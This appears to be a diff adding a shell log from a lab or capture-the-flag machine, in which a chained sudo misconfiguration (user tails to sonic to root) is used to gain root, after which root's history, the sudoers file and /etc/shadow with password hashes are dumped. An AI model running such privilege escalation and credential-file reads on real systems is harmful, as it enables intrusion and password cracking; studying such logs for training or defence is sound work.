@@ -1,0 +1,50 @@
+$ sudo -u sonic sudo id
+uid=0(root) gid=0(root) groups=0(root)
+$ sudo -u sonic sudo hostname
+378958b2c98e
+$ cat /etc/sudoers
+tails ALL=(sonic) NOPASSWD:ALL
+sonic ALL=(ALL) NOPASSWD:ALL
+$ ls -la /etc/sudoers.d
+total 12
+drwxr-xr-x 2 root root 4096 Oct 29  2024 .
+drwxr-xr-x 1 root root 4096 Oct 19 23:33 ..
+-r--r----- 1 root root 1068 Jan 29  2024 README
+$ ls -la /root
+total 24
+drwx------ 1 root root 4096 Oct 29  2024 .
+drwxr-xr-x 1 root root 4096 Oct 19 23:33 ..
+-rw------- 1 root root  150 Oct 29  2024 .bash_history
+-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
+-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
+drwx------ 2 root root 4096 Oct 29  2024 .ssh
+$ ls -la /root/.ssh
+total 8
+drwx------ 2 root root 4096 Oct 29  2024 .
+drwx------ 1 root root 4096 Oct 29  2024 ..
+$ cat /root/.bash_history
+ls
+cd sonic
+ls -la
+cd Documents
+cd Documentos
+cd ..
+ls
+cd usr
+ls
+cd ..
+cd home
+ls
+cd sonic
+ñls
+ls
+cd Documentos
+ls
+mv contrasena contraseña
+ls
+exit
+$ cat /etc/shadow (solo cabecera y cuentas con shell)
+root:*:20007:0:99999:7:::
+ubuntu:!:20007:0:99999:7:::
+sonic:$y$j9T$jNWDfsxv0veZMigizCFuf1$1t73JjsCFAmTtz60TDaZlChn5bbl8zwklmHp2aP3Ds6:20025:0:99999:7:::
+tails:$y$j9T$yUdF3xoNfgA5idX6.Fm/K.$luEB4OOZ8pQ7UZZkzmk8h3vORlzS1uIF//vXgweCYr.:20036:0:99999:7:::
